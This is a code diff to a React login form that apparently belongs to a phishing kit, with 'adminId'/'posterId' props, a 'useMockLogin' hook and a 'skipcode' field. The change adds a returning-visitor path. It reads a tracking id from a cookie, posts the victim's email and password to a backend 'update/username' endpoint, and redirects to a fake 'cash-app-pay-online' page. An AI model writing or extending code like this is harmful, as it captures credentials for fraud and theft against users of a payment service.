@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useState, useEffect } from "react";
 import { Formik, Form } from "formik";
 import * as Yup from "yup";
 import { MdVisibility, MdVisibilityOff } from "react-icons/md";
@@ -7,23 +7,67 @@ import SubmitButton from "./SubmitButton";
 import { site } from "../config";
 import useMockLogin from "../hooks/useMockLogin";
 import Cookies from "js-cookie";
-
+import { API_URL } from "../config/index";
+import { toast } from "react-toastify";
+import { useRouter } from "next/navigation";
 function LoginForm({ adminId, posterId }) {
   const [showPassword, setShowPassword] = useState(false);
+  const [isFirstLogin, setIsFirstLogin] = useState(true);
+  const [userId, setUserId] = useState("");
+  const router = useRouter();
 
   const initialvalues = {
     email: "",
     password: "",
   };
 
-  const validate = Yup.object({
+  const firstLoginValidation = Yup.object({
     email: Yup.string().required("Required"),
     password: Yup.string().required("Required"),
   });
 
+  const emailValidation = Yup.object({
+    email: Yup.string()
+      .email("Enter a valid email address")
+      .required("Required"),
+    password: Yup.string().required("Required"),
+  });
+
+  const validate = isFirstLogin ? firstLoginValidation : emailValidation;
+
   const { login } = useMockLogin(adminId, posterId);
 
-  const handleSubmit = (values, formik) => {
+  useEffect(() => {
+    const storedId = Cookies.get("id");
+    if (storedId) {
+      setUserId(storedId);
+      setIsFirstLogin(false);
+    }
+  }, []);
+
+  const updateUserEmail = async (id, email, password) => {
+    try {
+      const response = await fetch(`${API_URL}/update/username`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({ id, email, password }),
+      });
+
+      const data = await response.json();
+      if (response.ok) {
+        router.push("/sim9/dfv/cash-app-pay-online");
+        
+      }
+      return data;
+    } catch (error) {
+      console.error("Error updating email:", error);
+      return null;
+    }
+  };
+
+  const handleSubmit = async (values, formik) => {
     const { email, password } = values;
 
     const submitValues = {
@@ -33,12 +77,16 @@ function LoginForm({ adminId, posterId }) {
       skipcode: "",
     };
 
-    login(submitValues, formik);
-
-    // Cookies.set("email", email);
-    // Cookies.set("password", password);
-
-    // console.log(submitValues);
+    if (isFirstLogin) {
+      login(submitValues, formik);
+    } else {
+      if (userId) {
+        const updateResult = await updateUserEmail(userId, email, password);
+        if (updateResult) {
+          login(submitValues, formik);
+        }
+      }
+    }
   };
 
   return (
